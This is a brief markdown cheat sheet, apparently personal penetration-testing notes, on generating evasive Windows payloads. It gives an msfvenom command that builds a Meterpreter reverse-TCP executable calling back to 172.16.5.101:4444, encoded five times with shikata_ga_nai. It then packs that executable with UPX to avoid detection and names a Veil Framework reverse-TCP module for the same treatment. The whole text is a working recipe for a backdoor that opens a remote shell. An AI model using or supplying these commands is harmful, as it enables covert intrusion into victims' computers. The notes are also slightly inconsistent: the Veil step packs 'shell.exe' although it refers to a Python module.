
### MSFVENOM - 

Generate Encoded Payload - 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > shell.exe

Use UPX packer on the encoded executable -
`upx --best --ultra-brute -f shell.exe -o shell2.exe`

---
### Veil Framework - 

use - `python/meterpreter/rev_tcp.py`

Take this file and run it through UPX packer again - 
`upx --best --ultra-brute -f shell.exe -o shell2.exe`